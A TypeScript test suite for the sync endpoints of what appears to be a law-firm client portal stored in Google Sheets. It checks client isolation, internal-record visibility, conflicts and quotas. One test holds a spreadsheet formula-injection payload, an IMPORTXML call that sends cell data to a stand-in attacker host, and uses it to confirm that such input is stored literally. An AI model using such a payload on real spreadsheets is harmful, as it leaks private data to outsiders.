/**
 * Phase 1 acceptance: isolation between clients and visibility of INTERNO
 * records hold on the synchronization endpoints, including records that
 * change, move, get hidden or deleted while devices are offline.
 */
import { buildUserContext, canRead, type TableName } from '@empirica/shared';
import { ID, uid } from '@empirica/shared/testing';
import { describe, expect, it } from 'vitest';
import { Database } from './db/database.ts';
import { PROP } from './env.ts';
import { Device, op } from './testing/device.ts';
import { createWorld, type World } from './testing/harness.ts';

const A = ID.clienteA;
const CLIENT_USERS_OF_A = [ID.cAdmin, ID.cColab, ID.cLectura, ID.cAdminSur];
const ALL_ACTIVE = [ID.socio, ID.abogado, ID.asistente, ID.abogadoB, ...CLIENT_USERS_OF_A, ID.cB];
const INTERNAL_OF_A = [
  ['Asuntos', ID.asInterno],
  ['Tareas', ID.tInterna],
  ['Tareas', ID.tBajoInterno],
  ['Comentarios', ID.cmInterno],
  ['Comentarios', ID.cmEnInterno],
  ['Obligaciones', ID.obInterna],
] as const;

/** What the permission rules say the user may see, straight from the sheet. */
function expectedFor(w: World, userId: string): string[] {
  const db = new Database(w.env);
  const user = db.table('Usuarios').get(userId);
  if (!user) throw new Error('no user');
  const ctx = buildUserContext({
    user,
    membresias: db.rows('Membresias'),
    entidades: db.rows('Entidades'),
    clientes: db.rows('Clientes'),
  });
  const out: string[] = [];
  for (const t of [
    'Clientes',
    'Entidades',
    'Asuntos',
    'Tareas',
    'Tramites',
    'PlantillasTramite',
    'Obligaciones',
    'CumplimientosHistorial',
    'CatalogoObligaciones',
    'Contratos',
    'Documentos',
    'Solicitudes',
    'Comentarios',
    'Eventos',
    'DiasInhabiles',
    'Notificaciones',
    'Conflictos',
    'Sugerencias',
    'Reportes',
  ] as TableName[]) {
    for (const row of db.rows(t)) {
      if (!row.deleted && canRead(ctx, t, row, db.lookup())) out.push(`${t}:${row.id}`);
    }
  }
  return out.sort();
}

const keys = (d: Device): string[] => [...d.store.keys()].sort();

describe('first download', () => {
  const w = createWorld();

  it.each(ALL_ACTIVE)('user %s receives exactly what the rules allow', (userId) => {
    expect(keys(new Device(w, userId).sync())).toEqual(expectedFor(w, userId));
  });

  it('a sent monthly report reaches the users of the whole company; a draft, only the firm', () => {
    const has = (userId: string, id: string): boolean =>
      keys(new Device(w, userId).sync()).includes(`Reportes:${id}`);
    expect(has(ID.abogado, ID.repBorrador)).toBe(true);
    expect(has(ID.cAdmin, ID.repBorrador)).toBe(false);
    expect(has(ID.cAdmin, ID.repEnviado)).toBe(true);
    // A user of one unit: the report speaks of all of them.
    expect(has(ID.cColab, ID.repEnviado)).toBe(false);
    const copy = new Device(w, ID.cAdmin).sync().store.get(`Reportes:${ID.repEnviado}`);
    expect(copy).not.toHaveProperty('pdfId');
    expect(copy).not.toHaveProperty('enviadoA');
  });

  it('a unit user gets its unit, its branches, what is assigned to it, and nothing else', () => {
    const d = new Device(w, ID.cColab).sync();
    expect(d.ids('Clientes')).toEqual([A]);
    expect(d.ids('Entidades')).toEqual([ID.norte, ID.norte1].sort());
    expect(d.ids('Asuntos')).toEqual([ID.asNorte]);
    expect(d.ids('Tareas')).toEqual([ID.tNorte1, ID.tSurAsignada, ID.tDespacho].sort());
    expect(d.ids('Comentarios')).toEqual([ID.cmCompartido, ID.cmCliente].sort());
    expect(d.ids('Solicitudes')).toEqual([ID.solNorte]);
    expect(d.ids('Notificaciones')).toEqual([ID.notifColab]);
    expect(d.ids('Conflictos')).toEqual([]);
    expect(d.ids('PlantillasTramite')).toEqual([]);
  });

  it.each(CLIENT_USERS_OF_A)('client user %s never receives an INTERNO record', (userId) => {
    const d = new Device(w, userId).sync();
    expect(d.rows().filter((r) => r.visibilidad === 'INTERNO')).toEqual([]);
    for (const [t, id] of INTERNAL_OF_A) expect(d.has(t, id)).toBe(false);
  });

  it('nothing of client A reaches client B, and nothing of B reaches A', () => {
    const b = new Device(w, ID.cB).sync();
    expect(b.rows().filter((r) => r.clienteId === A || r.id === A)).toEqual([]);
    const lawyerB = new Device(w, ID.abogadoB).sync();
    expect(lawyerB.rows().filter((r) => r.clienteId === A || r.id === A)).toEqual([]);
    for (const userId of [...CLIENT_USERS_OF_A, ID.abogado]) {
      const d = new Device(w, userId).sync();
      expect(d.rows().filter((r) => r.clienteId === ID.clienteB || r.id === ID.clienteB)).toEqual(
        [],
      );
    }
  });

  it('client users get no internal columns; nobody gets server-only ones or bookkeeping', () => {
    const client = new Device(w, ID.cColab).sync();
    const cliente = client.get('Clientes', A);
    for (const k of ['driveFolderId', 'calendarId', 'modoIA', 'membershipEpoch']) {
      expect(cliente).not.toHaveProperty(k);
    }
    expect(client.get('Documentos', ID.docNorte)).not.toHaveProperty('driveFileId');
    const firm = new Device(w, ID.socio).sync();
    expect(firm.get('Clientes', A)).toHaveProperty('driveFolderId', 'drive-folder-a');
    for (const d of [client, firm]) {
      for (const r of d.rows()) {
        expect(r).not.toHaveProperty('alcanceHist');
        expect(r).not.toHaveProperty('seqAlta');
        expect(r).not.toHaveProperty('membershipEpoch');
      }
    }
  });

  it('sends users, memberships and settings once, and again only when they change', () => {
    const d = new Device(w, ID.cColab).sync();
    const first = d.takeSnapshot();
    expect(first?.Usuarios.map((u) => u.id)).toContain(ID.abogado);
    expect(first?.Usuarios.map((u) => u.id)).not.toContain(ID.cB);
    expect(d.sync().takeSnapshot()).toBeUndefined();
    w.edit('Usuarios', ID.abogado, { nombre: 'Abogado Demo Renombrado' });
    const third = d.sync().takeSnapshot();
    expect(third?.hash).not.toBe(first?.hash);
    expect(third?.Usuarios.find((u) => u.id === ID.abogado)?.nombre).toBe(
      'Abogado Demo Renombrado',
    );
  });

  it('pages through large downloads without losing or repeating anything', () => {
    const whole = new Device(w, ID.socio).sync();
    const paged = new Device(w, ID.socio).sync(3);
    expect(paged.last.pages).toBeGreaterThan(5);
    expect(keys(paged)).toEqual(keys(whole));
    expect(new Set(paged.last.changes).size).toBe(paged.last.changes.length);
  });
});

describe('incremental sync', () => {
  it('answers from memory when nothing changed, without reading the big tabs', () => {
    const w = createWorld();
    const d = new Device(w, ID.cColab).sync();
    const tareas = w.google.sheet('Tareas');
    const reads = tareas.reads;
    const cursor = d.cursor;
    d.sync();
    expect(d.last.changes).toEqual([]);
    expect(d.cursor).toBe(cursor);
    expect(tareas.reads).toBe(reads);
  });

  it('a new shared task reaches its unit and the hub, and nobody else', () => {
    const w = createWorld();
    const devices = Object.fromEntries(ALL_ACTIVE.map((u) => [u, new Device(w, u).sync()]));
    const id = uid(0x60001);
    const lawyer = devices[ID.abogado];
    expect(
      lawyer?.push([
        op('Tareas', 'create', id, {
          clienteId: A,
          asuntoId: ID.asNorte,
          entidadId: ID.norte,
          titulo: 'Firmar el acta',
          ladoResponsable: 'CLIENTE',
          estado: 'POR_HACER',
          visibilidad: 'COMPARTIDO',
        }),
      ]),
    ).toMatchObject([{ status: 'applied' }]);
    const got = (u: string) => devices[u]?.sync().has('Tareas', id);
    expect(
      [ID.socio, ID.abogado, ID.asistente, ID.cAdmin, ID.cColab, ID.cLectura].map(got),
    ).toEqual([true, true, true, true, true, true]);
    expect([ID.cAdminSur, ID.cB, ID.abogadoB].map(got)).toEqual([false, false, false]);
  });

  it('an internal comment reaches the firm only, and client devices learn nothing of it', () => {
    const w = createWorld();
    const client = new Device(w, ID.cAdmin).sync();
    const firm = new Device(w, ID.asistente).sync();
    const id = uid(0x60002);
    firm.push([
      op('Comentarios', 'create', id, {
        tipoEntidad: 'Asuntos',
        entidadId: ID.asNorte,
        texto: 'Valorar si conviene impugnar.',
        visibilidad: 'INTERNO',
      }),
    ]);
    client.sync();
    expect(client.last).toMatchObject({ changes: [], removed: [] });
    expect(firm.sync().has('Comentarios', id)).toBe(true);
  });
});

describe('records that leave a user’s view', () => {
  const hideNorte = (w: World) =>
    new Device(w, ID.abogado).push([
      op(
        'Asuntos',
        'update',
        ID.asNorte,
        { visibilidad: 'INTERNO' },
        { base: { visibilidad: 'COMPARTIDO' } },
      ),
    ]);

  it('hiding a matter removes it and everything attached from client devices', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const hub = new Device(w, ID.cAdmin).sync();
    const other = new Device(w, ID.cB).sync();
    expect(hideNorte(w)).toMatchObject([{ status: 'applied' }]);

    const gone = [
      `Asuntos:${ID.asNorte}`,
      `Tareas:${ID.tNorte1}`,
      `Tareas:${ID.tDespacho}`,
      `Tramites:${ID.trNorte}`,
      `Comentarios:${ID.cmCompartido}`,
      `Comentarios:${ID.cmCliente}`,
      `Documentos:${ID.docNorte}`,
      `Eventos:${ID.evNorte}`,
    ].sort();
    expect(colab.sync().last.removed.sort()).toEqual(gone);
    expect(hub.sync().last.removed.sort()).toEqual(gone);
    expect(colab.last.changes).toEqual([]);
    expect(other.sync().last).toMatchObject({ changes: [], removed: [] });
  });

  it('the drop signal never names a record that was always internal', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    hideNorte(w);
    const named = colab.sync().last.removed;
    for (const [t, id] of INTERNAL_OF_A) expect(named).not.toContain(`${t}:${id}`);
    // And a device that never saw the matter is told nothing at all.
    const fresh = new Device(w, ID.cColab).sync();
    expect(fresh.last.removed).toEqual([]);
    expect(fresh.has('Asuntos', ID.asNorte)).toBe(false);
  });

  it('sharing it again brings everything back', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const before = keys(colab);
    hideNorte(w);
    colab.sync();
    new Device(w, ID.abogado).push([
      op(
        'Asuntos',
        'update',
        ID.asNorte,
        { visibilidad: 'COMPARTIDO' },
        { base: { visibilidad: 'INTERNO' } },
      ),
    ]);
    expect(keys(colab.sync())).toEqual(before);
  });

  it('editing an always-internal record tells client devices nothing', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    new Device(w, ID.abogado).push([
      op('Tareas', 'update', ID.tInterna, { titulo: 'Revisar criterio (urgente)' }),
    ]);
    expect(colab.sync().last).toMatchObject({ changes: [], removed: [] });
  });

  it('moving a task to another unit moves it between unit users', () => {
    const w = createWorld();
    const norte = new Device(w, ID.cColab).sync();
    const sur = new Device(w, ID.cAdminSur).sync();
    new Device(w, ID.abogado).push([op('Tareas', 'update', ID.tDespacho, { entidadId: ID.sur })]);
    expect(norte.sync().last.removed).toEqual([`Tareas:${ID.tDespacho}`]);
    expect(sur.sync().last.changes).toEqual([`Tareas:${ID.tDespacho}`]);
  });

  it('unassigning a user removes what it saw only because it was assigned', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    expect(colab.has('Tareas', ID.tSurAsignada)).toBe(true);
    new Device(w, ID.abogado).push([
      op('Tareas', 'update', ID.tSurAsignada, { responsableId: ID.cAdminSur }),
    ]);
    expect(colab.sync().last.removed).toEqual([`Tareas:${ID.tSurAsignada}`]);
  });

  it('a deletion travels as a dated tombstone; a restore brings the record back', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const firm = new Device(w, ID.abogado);
    firm.push([
      op('Tareas', 'delete', ID.tNorte1, undefined, { at: '2026-10-02T11:59:30.000-05:00' }),
    ]);
    const data = w.ok<{ removed: { t: string; id: string; deleted?: string }[] }>(
      'sync.pull',
      { cursor: colab.cursor, epochs: colab.epochs },
      { as: ID.cColab },
    );
    expect(data.removed).toEqual([
      { t: 'Tareas', id: ID.tNorte1, deleted: '2026-10-02T11:59:30.000-05:00' },
    ]);
    colab.sync();
    expect(colab.has('Tareas', ID.tNorte1)).toBe(false);
    firm.push([op('Tareas', 'restore', ID.tNorte1)]);
    expect(colab.sync().has('Tareas', ID.tNorte1)).toBe(true);
  });

  it('moving a unit in the tree makes every device of that client download it again', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const sur = new Device(w, ID.cAdminSur).sync();
    expect(colab.has('Tareas', ID.tNorte1)).toBe(true);
    new Device(w, ID.socio).push([op('Entidades', 'update', ID.norte1, { parentId: ID.sur })]);
    colab.sync();
    expect(colab.last.resets).toEqual([A]);
    expect(colab.has('Tareas', ID.tNorte1)).toBe(false);
    expect(colab.has('Entidades', ID.norte1)).toBe(false);
    expect(keys(colab)).toEqual(expectedFor(w, ID.cColab));
    expect(keys(sur.sync())).toEqual(expectedFor(w, ID.cAdminSur));
    expect(sur.has('Tareas', ID.tNorte1)).toBe(true);
  });

  it('a revoked membership wipes the client from the device and blocks queued changes', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const membership = w.rows('Membresias').find((m) => m.usuarioId === ID.cColab);
    w.edit('Membresias', membership?.id ?? '', { estado: 'REVOCADA' });
    colab.sync();
    expect(colab.rows().filter((r) => r.clienteId === A || r.id === A)).toEqual([]);
    expect(colab.push([op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' })])).toMatchObject([
      { status: 'rejected', code: 'NOT_FOUND' },
    ]);
  });

  it('when the history is too old to tell, the client is sent whole instead of guessing', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const firm = new Device(w, ID.abogado);
    let visibilidad = 'COMPARTIDO';
    // 21 changes: more than the history keeps, ending internal.
    for (let i = 0; i < 21; i++) {
      const next = visibilidad === 'COMPARTIDO' ? 'INTERNO' : 'COMPARTIDO';
      firm.push([
        op('Tareas', 'update', ID.tNorte1, { visibilidad: next }, { base: { visibilidad } }),
      ]);
      visibilidad = next;
    }
    colab.sync();
    expect(colab.last.resets).toEqual([A]);
    expect(keys(colab)).toEqual(expectedFor(w, ID.cColab));
  });
});

describe('sync.push', () => {
  it('applies a client user’s allowed change, versions it and logs it', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab);
    const [result] = colab.push([op('Tareas', 'update', ID.tNorte1, { estado: 'EN_REVISION' })]);
    expect(result).toMatchObject({ status: 'applied', row: { estado: 'EN_REVISION', version: 2 } });
    expect(result?.row).not.toHaveProperty('calendarEventId');
    const log = w.rows('Bitacora').filter((b) => b.entidadId === ID.tNorte1);
    expect(log).toMatchObject([
      {
        accion: 'EDITAR',
        usuarioId: ID.cColab,
        clienteId: A,
        antes: { estado: 'POR_HACER' },
        despues: { estado: 'EN_REVISION' },
      },
    ]);
  });

  it('rejects a forbidden change, writes nothing and logs the attempt', () => {
    const w = createWorld();
    const [result] = new Device(w, ID.cColab).push([
      op('Tareas', 'update', ID.tNorte1, { estado: 'HECHO' }),
    ]);
    expect(result).toMatchObject({
      status: 'rejected',
      code: 'FORBIDDEN',
      reason: 'TASK_STATE',
      field: 'estado',
    });
    expect(w.row('Tareas', ID.tNorte1)).toMatchObject({ estado: 'POR_HACER', version: 1 });
    expect(w.rows('Bitacora').filter((b) => b.accion === 'RECHAZO')).toHaveLength(1);
  });

  it('is idempotent: an operation sent twice is applied once', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab);
    const once = op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' });
    expect(colab.push([once])).toMatchObject([{ status: 'applied' }]);
    expect(colab.push([once, once])).toMatchObject([
      { status: 'duplicate', row: { estado: 'EN_CURSO', version: 2 } },
      { status: 'duplicate' },
    ]);
    expect(w.row('Tareas', ID.tNorte1)?.version).toBe(2);
    expect(w.rows('Bitacora').filter((b) => b.accion === 'EDITAR')).toHaveLength(1);
    const rejected = op('Tareas', 'update', ID.tNorte1, { estado: 'HECHO' });
    const first = colab.push([rejected]);
    expect(colab.push([rejected])).toEqual(first);
  });

  it('a malformed operation is rejected alone; the rest of the queue goes through', () => {
    const w = createWorld();
    const results = w.ok<{ results: { opId: string; status: string; reason?: string }[] }>(
      'sync.push',
      {
        ops: [
          { opId: 'no-es-uuid', table: 'Tareas', type: 'update', id: ID.tNorte1 },
          op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' }),
          { ...op('Tareas', 'update', ID.cColab, { nombre: 'x' }), table: 'Usuarios' },
        ],
      },
      { as: ID.cColab },
    ).results;
    expect(results.map((r) => [r.status, r.reason])).toEqual([
      ['rejected', 'INVALID_OP'],
      ['applied', undefined],
      ['rejected', 'INVALID_OP'],
    ]);
  });

  it('an operation id belongs to the user who sent it', () => {
    const w = createWorld();
    const mine = op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' });
    new Device(w, ID.cColab).push([mine]);
    expect(new Device(w, ID.cAdmin).push([mine])).toMatchObject([
      { status: 'rejected', reason: 'OP_ID_TAKEN' },
    ]);
  });

  it('applies a batch in order: a matter and a task inside it', () => {
    const w = createWorld();
    const matter = uid(0x60010);
    const task = uid(0x60011);
    const results = new Device(w, ID.abogado).push([
      op('Asuntos', 'create', matter, {
        clienteId: A,
        titulo: 'Nuevo asunto',
        area: 'LABORAL',
        estado: 'ACTIVO',
        visibilidad: 'COMPARTIDO',
      }),
      op('Tareas', 'create', task, {
        asuntoId: matter,
        titulo: 'Primera tarea',
        ladoResponsable: 'EMPIRICA',
        estado: 'POR_HACER',
        visibilidad: 'COMPARTIDO',
      }),
    ]);
    expect(results).toMatchObject([
      { status: 'applied' },
      { status: 'applied', row: { clienteId: A } },
    ]);
  });

  it('a new client works in the same batch: the partner adds its units offline', () => {
    const w = createWorld();
    const client = uid(0x60020);
    const unit = uid(0x60021);
    const results = new Device(w, ID.socio).push([
      op('Clientes', 'create', client, {
        razonSocial: 'Cliente Nuevo Demo, S.A. de C.V.',
        servicio: 'FLT_IGUALA',
        estado: 'ACTIVO',
      }),
      op('Entidades', 'create', unit, { clienteId: client, nombre: 'Planta', tipo: 'UNIDAD' }),
    ]);
    expect(results).toMatchObject([
      { status: 'applied', row: { id: client } },
      { status: 'applied', row: { id: unit, clienteId: client } },
    ]);
    expect(results[0]?.removed).toBeUndefined();
  });

  it('feedback: anyone sends it, the administrators answer it, only its author sees it', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    const id = uid(0x60030);
    expect(
      colab.push([
        op('Sugerencias', 'create', id, {
          tipo: 'ERROR',
          mensaje: 'No aparece mi sucursal en el inicio.',
          pantalla: '#/',
        }),
      ]),
    ).toMatchObject([{ status: 'applied', row: { usuarioId: ID.cColab, estado: 'NUEVA' } }]);

    const socio = new Device(w, ID.socio).sync();
    expect(socio.has('Sugerencias', id)).toBe(true);
    for (const other of [ID.cAdmin, ID.abogado, ID.cB]) {
      expect(new Device(w, other).sync().has('Sugerencias', id)).toBe(false);
    }

    // The answer comes an hour later.
    w.clock.advance(3_600_000);
    expect(
      socio.push([
        op(
          'Sugerencias',
          'update',
          id,
          { estado: 'RESUELTA', respuesta: 'Ya aparece. Gracias.' },
          { at: new Date(w.clock.now()).toISOString() },
        ),
      ]),
    ).toMatchObject([{ status: 'applied' }]);
    colab.sync();
    expect(colab.store.get(`Sugerencias:${id}`)?.row).toMatchObject({
      estado: 'RESUELTA',
      respuesta: 'Ya aparece. Gracias.',
    });
  });

  it('another client’s records answer NOT_FOUND and are left untouched', () => {
    const w = createWorld();
    const b = new Device(w, ID.cB);
    const results = b.push([
      op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' }),
      op('Solicitudes', 'create', uid(0x60020), { clienteId: A, titulo: 'x', estado: 'RECIBIDA' }),
      op('Comentarios', 'create', uid(0x60021), {
        tipoEntidad: 'Asuntos',
        entidadId: ID.asNorte,
        texto: 'x',
      }),
      op('Tareas', 'update', uid(0xbadbad), { estado: 'EN_CURSO' }),
    ]);
    expect(results.map((r) => [r.status, r.code])).toEqual([
      ['rejected', 'NOT_FOUND'],
      ['rejected', 'NOT_FOUND'],
      ['rejected', 'NOT_FOUND'],
      ['rejected', 'NOT_FOUND'],
    ]);
    expect(JSON.stringify(results)).not.toContain(A);
    expect(w.row('Tareas', ID.tNorte1)?.version).toBe(1);
  });

  it('merges edits of different fields made offline on two devices', () => {
    const w = createWorld();
    const a = new Device(w, ID.abogado);
    const b = new Device(w, ID.asistente);
    a.push([
      op(
        'Asuntos',
        'update',
        ID.asNorte,
        { titulo: 'Licencia (renovación)' },
        { at: '2026-10-02T11:00:00.000-05:00', baseVersion: 1 },
      ),
    ]);
    expect(
      b.push([
        op(
          'Asuntos',
          'update',
          ID.asNorte,
          { prioridad: 'ALTA' },
          { at: '2026-10-02T10:00:00.000-05:00', baseVersion: 1 },
        ),
      ]),
    ).toMatchObject([{ status: 'applied' }]);
    expect(w.row('Asuntos', ID.asNorte)).toMatchObject({
      titulo: 'Licencia (renovación)',
      prioridad: 'ALTA',
      version: 3,
    });
  });

  it('keeps the most recent edit of a field and reports the one that lost', () => {
    const w = createWorld();
    new Device(w, ID.abogado).push([
      op(
        'Asuntos',
        'update',
        ID.asNorte,
        { titulo: 'Más reciente' },
        { at: '2026-10-02T11:00:00.000-05:00' },
      ),
    ]);
    expect(
      new Device(w, ID.asistente).push([
        op(
          'Asuntos',
          'update',
          ID.asNorte,
          { titulo: 'Más viejo' },
          { at: '2026-10-02T10:00:00.000-05:00' },
        ),
      ]),
    ).toMatchObject([
      { status: 'applied', superseded: ['titulo'], row: { titulo: 'Más reciente' } },
    ]);
  });

  it('a legally sensitive field never changes silently: conflict, notice and a lawyer decides', () => {
    const w = createWorld();
    const lawyer = new Device(w, ID.abogado);
    const assistant = new Device(w, ID.asistente);
    const base = { fechaLimite: '2026-10-15' };
    expect(
      lawyer.push([op('Tareas', 'update', ID.tNorte1, { fechaLimite: '2026-10-20' }, { base })]),
    ).toMatchObject([{ status: 'applied' }]);
    expect(
      assistant.push([op('Tareas', 'update', ID.tNorte1, { fechaLimite: '2026-10-18' }, { base })]),
    ).toMatchObject([
      { status: 'conflict', conflicts: ['fechaLimite'], row: { fechaLimite: '2026-10-20' } },
    ]);
    const conflict = w
      .rows('Conflictos')
      .find((c) => c.entidadId === ID.tNorte1 && c.propuestoPor === ID.asistente);
    expect(conflict).toMatchObject({
      clienteId: A,
      entidad: 'Tareas',
      campo: 'fechaLimite',
      valorVigente: '"2026-10-20"',
      valorPropuesto: '"2026-10-18"',
      estado: 'PENDIENTE',
    });
    const notice = w.rows('Notificaciones').find((n) => n.tipo === 'CONFLICTO');
    expect(notice).toMatchObject({ usuarioId: ID.abogado, clienteId: A, leida: false });
    expect(lawyer.sync().has('Conflictos', conflict?.id ?? '')).toBe(true);
    expect(lawyer.has('Notificaciones', notice?.id ?? '')).toBe(true);
    for (const u of CLIENT_USERS_OF_A) {
      expect(new Device(w, u).sync().ids('Conflictos')).toEqual([]);
    }
  });

  it('a device clock running far ahead does not win forever', () => {
    const w = createWorld();
    new Device(w, ID.abogado).push([
      op(
        'Asuntos',
        'update',
        ID.asNorte,
        { titulo: 'Del futuro' },
        { at: '2027-10-02T12:00:00.000-05:00' },
      ),
    ]);
    const stamps = w.row('Asuntos', ID.asNorte)?.fieldTimestamps as Record<string, string>;
    expect(stamps.titulo).toBe('2026-10-02T12:00:00.000-05:00');
  });

  it('a deletion older than the last edit is refused: newer work is never lost', () => {
    const w = createWorld();
    const firm = new Device(w, ID.abogado);
    firm.push([
      op(
        'Tareas',
        'update',
        ID.tNorte1,
        { titulo: 'Editada hoy' },
        { at: '2026-10-02T11:00:00.000-05:00' },
      ),
    ]);
    expect(
      firm.push([
        op('Tareas', 'delete', ID.tNorte1, undefined, { at: '2026-10-01T09:00:00.000-05:00' }),
      ]),
    ).toMatchObject([{ status: 'rejected', code: 'CONFLICT', reason: 'EDITED_AFTER_DELETION' }]);
  });

  it('what a client types is stored literally and never becomes a formula', () => {
    const w = createWorld();
    const id = uid(0x60030);
    const titulo = '=IMPORTXML("https://atacante.example/?q="&A1;"//a")';
    expect(
      new Device(w, ID.cColab).push([
        op('Solicitudes', 'create', id, {
          clienteId: A,
          entidadId: ID.norte,
          titulo,
          estado: 'RECIBIDA',
        }),
      ]),
    ).toMatchObject([{ status: 'applied', row: { titulo } }]);
    expect(w.google.formulas).toEqual([]);
    expect(new Device(w, ID.abogado).sync().get('Solicitudes', id)?.titulo).toBe(titulo);
  });

  it('answers BUSY when another write holds the lock; reading still works', () => {
    const w = createWorld();
    w.google.lockBusy = true;
    const res = w.call(
      'sync.push',
      { ops: [op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' })] },
      { as: ID.cColab },
    );
    expect(res).toMatchObject({ ok: false, error: { code: 'BUSY' } });
    expect(w.call('sync.pull', { cursor: 0 }, { as: ID.cColab }).ok).toBe(true);
  });

  it('numbers changes after any reserved by a write that died half way', () => {
    const w = createWorld();
    const committed = Number(w.google.props.get(PROP.seqCommitted));
    w.google.props.set(PROP.seqReserved, String(committed + 10));
    new Device(w, ID.abogado).push([
      op('Tareas', 'update', ID.tNorte1, { titulo: 'Tras la caída' }),
    ]);
    expect(w.row('Tareas', ID.tNorte1)?.serverSeq).toBe(committed + 11);
    expect(Number(w.google.props.get(PROP.seqCommitted))).toBe(committed + 11);
  });

  it('readers never return rows of a write still in progress', () => {
    const w = createWorld();
    const colab = new Device(w, ID.cColab).sync();
    // A row written with a number not yet committed: invisible until the commit.
    const committed = Number(w.google.props.get(PROP.seqCommitted));
    const db = new Database(w.env);
    const task = db.table('Tareas').get(ID.tNorte1);
    if (!task) throw new Error('missing task');
    db.table('Tareas').put({ ...task, titulo: 'A medio escribir', serverSeq: committed + 1 });
    db.flush();
    expect(colab.sync().last.changes).toEqual([]);
    w.google.props.set(PROP.seqCommitted, String(committed + 1));
    expect(colab.sync().last.changes).toEqual([`Tareas:${ID.tNorte1}`]);
  });
});

describe('daily quotas of a free account', () => {
  it('reads Script Properties once per request (50,000 a day in total)', () => {
    const w = createWorld();
    const device = new Device(w, ID.cColab).sync();
    const before = w.google.propertyCalls;
    device.sync();
    expect(w.google.propertyCalls - before).toBe(1);
    const beforePush = w.google.propertyCalls;
    device.push([op('Tareas', 'update', ID.tNorte1, { estado: 'EN_CURSO' })]);
    // one read, then reserve and commit
    expect(w.google.propertyCalls - beforePush).toBe(3);
  });

  it('keeps each audit entry within what a sheet cell holds', () => {
    const w = createWorld();
    const firm = new Device(w, ID.abogado);
    const long = (c: string) => c.repeat(19_000);
    expect(
      firm.push([op('Asuntos', 'update', ID.asNorte, { titulo: 'x'.repeat(900) })]),
    ).toMatchObject([{ status: 'applied' }]);
    const id = uid(0x60040);
    firm.push([
      op('Tareas', 'create', id, {
        clienteId: A,
        titulo: 'Con descripción larga',
        descripcion: long('a'),
        // With the description, more than a cell holds if logged as is.
        checklist: [{ id: 'c1', texto: 'x'.repeat(39_000), hecho: false }],
        ladoResponsable: 'EMPIRICA',
        estado: 'POR_HACER',
        visibilidad: 'COMPARTIDO',
      }),
    ]);
    expect(firm.push([op('Tareas', 'update', id, { descripcion: long('b') })])).toMatchObject([
      { status: 'applied' },
    ]);
    const sheet = w.google.sheet('Bitacora');
    const longest = Math.max(
      ...sheet.grid.flat().map((v) => (typeof v === 'string' ? v.length : 0)),
    );
    expect(longest).toBeLessThan(50_000);
    const created = w.rows('Bitacora').find((b) => b.entidadId === id && b.accion === 'CREAR');
    expect(JSON.stringify(created?.despues)).toContain('caracteres)');
  });
});
